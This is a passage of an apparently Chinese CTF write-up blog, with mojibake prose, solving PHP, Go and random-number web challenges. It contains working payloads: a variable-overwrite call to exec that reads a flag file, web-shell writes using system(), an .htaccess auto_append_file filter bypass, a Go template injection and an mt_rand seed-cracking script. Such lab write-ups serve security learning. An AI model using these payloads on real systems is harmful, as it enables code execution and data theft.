            <span class="variable">$n</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆ</p><p>new Tempæ—¶ä¼šå¯¹this-&gt;dateèµ‹å€¼ï¼Œç„¶åè¿›å…¥display()æ–¹æ³•åå‘ç°æœ‰ä¸€ä¸ªextract($this-&gt;date);ï¼Œè¿™å¯ä»¥è¿›è¡Œå˜é‡è¦†ç›–ï¼Œçœ‹åé¢$this-&gt;getTempName($template,$space);ï¼Œè·Ÿè¿›åå‘ç°$diréœ€è¦ä¸ºadminï¼Œé‚£ä¹ˆæˆ‘ä»¬å˜é‡è¦†ç›–å³å¯ï¼ŒPOSTä¸€ä¸ªspace&#x3D;adminï¼Œæ¥ç€çœ‹åé¢if(!is_file($this-&gt;template))ï¼Œè®©GET ?file&#x3D;index.htmlå³å¯ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205190842283.png" alt="image-20241205190842283" style="zoom:80%;" /><p>ç„¶åæ­¤å¤„includeäº†è¿™ä¸²phpä»£ç ï¼Œè°ƒç”¨äº†listdataæ–¹æ³•ï¼Œä¼ å‚action&#x3D;list module&#x3D;$mod</p><p>è¿™é‡Œåªæœ‰$modæ—¶å¯æ§çš„ã€‚</p><blockquote><p>action&#x3D;list&amp;module&#x3D;$mod</p><p>mod&#x3D;xxx action&#x3D;function </p><p>action&#x3D;list module&#x3D;xxx action&#x3D;function  force&#x3D;false name&#x3D;phpinfo()</p></blockquote><p>è¿™é‡Œåé¢ä¼ å…¥çš„actionæŠŠå‰é¢çš„listè¦†ç›–æ‰å°±å¯ä»¥äº†ï¼Œç”¨functionæ¥è¦†ç›–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?filename=index.html</span><br><span class="line">POST:space=admin&amp;mod=xxx action=function  force=0 name=phpinfo</span><br></pre></td></tr></table></figure><p>åœ¨phpinfoé‡Œé¢å¯ä»¥æ‰¾åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;45956a8b-37e3-43e1-9ec0-664239b74a90&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?filename=index.html</span><br><span class="line">POST:space=admin&amp;mod=xxx action=function  force=0 name=exec param=tac$&#123;IFS&#125;/f11111111aaaagggg&gt;1.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205195913384.png" alt="image-20241205195913384"></p><h2 id="ç¾ŠåŸæ¯-2020-easyphp"><a href="#ç¾ŠåŸæ¯-2020-easyphp" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]easyphp"></a>[ç¾ŠåŸæ¯ 2020]easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å¾ˆå¥½ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=b.php&amp;content=&lt;?php system(&#x27;ls /&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202211925.png" alt="image-20241205202211925"></p><p>æ²¡æœ‰è§£æphpï¼Œä¸ºå•¥å•Šæ˜æ˜æ˜¯phpä½†æ˜¯è§£æä¸äº†ï¼Œå¯èƒ½æ˜¯é¶æœºç›®å½•ç¯å¢ƒä¸èƒ½è§£æphpæ–‡ä»¶</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202303024.png" alt="image-20241205202303024"></p><p>ApacheæœåŠ¡å™¨</p><p>å°è¯•ç”¨.htaccessæ¥æ‰§è¡Œjpgæ–‡ä»¶ä¸­çš„phpä»£ç </p><p>ä½†æ˜¯è¿™é‡Œè¢«è¿‡æ»¤äº†å•Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=AddType application/x-http-php .jpg</span><br></pre></td></tr></table></figure><p>ä½†è¿™ä¸ªè¿‡æ»¤æ˜¯å¾ˆå¥½ç»•è¿‡çš„å¯ä»¥ç”¨åæ–œæ åŠ %0aæ¥ç»•è¿‡ï¼Œä½†æ˜¯è¿™æ ·çš„è¯å°±è¦æ±‚ä¸Šä¼ ä¸¤æ¬¡æ–‡ä»¶ï¼Œè€Œè¿™ä¸ªé¢˜ç›®ç¯å¢ƒä¸èƒ½ä¸Šä¼ ä¸¤æ¬¡æ–‡ä»¶ï¼Œå› æ­¤åªèƒ½ä¸Šä¼ ä¸€æ¬¡.htaccessï¼Œé‚£ä¹ˆèƒ½åˆ©ç”¨çš„å°±åªæœ‰index.phpäº†ï¼Œè¿™è¿˜ä¸å¦‚ç›´æ¥å†™å…¥index.phpæ–‡ä»¶å‘¢ï¼ä½†æ˜¯æ˜¯ä¸èƒ½è§£æçš„ã€‚å› æ­¤æˆ‘ä»¬åªèƒ½åˆ©ç”¨.htaccessæ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œæˆ–è€…å†™é©¬ï¼Œç®€å•ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_fi\%0ale .htaccess%0a%23&lt;?php system(&#x27;ls /&#x27;);?&gt;\</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value auto_append_fi\%0Ale .htaccess%0A%23&lt;?php system(&#x27;tac /f*&#x27;);?&gt;\</span><br></pre></td></tr></table></figure><h2 id="SCTF-2021-loginme"><a href="#SCTF-2021-loginme" class="headerlink" title="[SCTF 2021]loginme"></a>[SCTF 2021]loginme</h2><p>è·å¾—æºç </p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206105852832.png" alt="image-20241206105852832" style="zoom:80%;" /><p>è¿‡æ»¤äº†ä¿©ï¼Œå¯ä»¥ç”¨ç”¨X-Real-IP</p><p>ç„¶åçœ‹çœ‹æºç route.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">_ <span class="string">&quot;embed&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;loginme/structs&quot;</span></span><br><span class="line"><span class="string">&quot;loginme/templates&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.tmpl&quot;</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;Try Loginme&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">idString, flag := c.GetQuery(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">idString = <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">id, err := strconv.Atoi(idString)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">id = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">TargetUser := structs.Admin</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> structs.Users &#123;</span><br><span class="line"><span class="keyword">if</span> user.Id == id &#123;</span><br><span class="line">TargetUser = user</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">age := TargetUser.Age</span><br><span class="line"><span class="keyword">if</span> age == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">age, flag = c.GetQuery(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">age = <span class="string">&quot;forever 18 (Tell me the age)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl, err := template.New(<span class="string">&quot;admin_index&quot;</span>).Parse(html)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl.Execute(c.Writer, TargetUser)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>structs.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> structs</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> UserInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">Id       <span class="type">int</span></span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">Age      <span class="type">string</span></span><br><span class="line">Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Users = []UserInfo&#123;</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">1</span>,</span><br><span class="line">Username: <span class="string">&quot;Grandpa Lu&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;22&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;hack you!&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">2</span>,</span><br><span class="line">Username: <span class="string">&quot;Longlone&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;??&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;i don&#x27;t know&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">3</span>,</span><br><span class="line">Username: <span class="string">&quot;Teacher Ma&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;20&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;guess&quot;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Admin = UserInfo&#123;</span><br><span class="line">Id:       <span class="number">0</span>,</span><br><span class="line">Username: <span class="string">&quot;Admin&quot;</span>,</span><br><span class="line">Age:      <span class="string">&quot;&quot;</span>,</span><br><span class="line">Password: <span class="string">&quot;flag&#123;&#125;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135001872.png" alt="image-20241206135001872"></p><p>æˆ‘ä»¬å‘ç°å½“idä¸º0æ—¶ageä¸ºç©ºï¼Œæ­¤æ—¶ageæ˜¯å¯ä»¥ç”±æˆ‘ä»¬è‡ªå·±ä¼ å‚çš„ï¼Œä¹Ÿå°±æ˜¯å¯æ§çš„ï¼Œåç»­çš„ä»£ç å¯¹ageè¿›è¡Œäº†æ¨¡æ¿æ¸²æŸ“ï¼Œå­˜åœ¨sstiã€‚</p><p>è€Œåœ¨goè¯­è¨€ä¸­ä½¿ç”¨çš„æ˜¯<code>&#123;&#123;.name&#125;&#125;</code>ä»£è¡¨è¦åº”ç”¨çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥è®©<code>age=&#123;&#123;.Password&#125;&#125;</code></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/88f0ac4113ccb65120ad8a4bb3409bda.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‹¿ä¸‹äº†</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135214358.png" alt="image-20241206135214358"></p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162301273.png" alt="image-20241206162301273" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162320564.png" alt="image-20241206162320564" style="zoom:67%;" /><p>ç½‘é¡µæºä»£ç ä¸­å‘ç°jsä»£ç ï¼Œå­˜åœ¨æ ¡éªŒç•Œé¢check.phpï¼Œæ‰“å¼€çœ‹çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure><p>å·²çŸ¥æ•°çŒœç§å­ï¼Œh5n5BBh4Rg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">str1 =<span class="string">&#x27;h5n5BBh4Rg&#x27;</span></span><br><span class="line">str2 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">result =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">length = <span class="built_in">str</span>(<span class="built_in">len</span>(str2)-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str2)):</span><br><span class="line">        <span class="keyword">if</span> str1[i] ==  str2[j]:</span><br><span class="line">            result += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> +<span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + length + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s pretend to know only the first password.  We need to convert it to</span><br><span class="line">inputs to php_mt_seed</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7 7 0 61 31 31 0 61 13 13 0 61 31 31 0 61 37 37 0 61 37 37 0 61 7 7 0 61 30 30 0 61 53 53 0 61 6 6 0 61</span><br></pre></td></tr></table></figure><p>ä¼ å…¥php_mt_seedå³å¯ï¼</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170630174.png" alt="image-20241206170630174"></p><p>æ‹¿ä¸‹ç§å­ï¼53788000</p><p>æ„é€ ä¸€ä¸‹éšæœºæ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">53788000</span>);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170818784.png" alt="image-20241206170818784"></p><h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce-3"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce-3" class="headerlink" 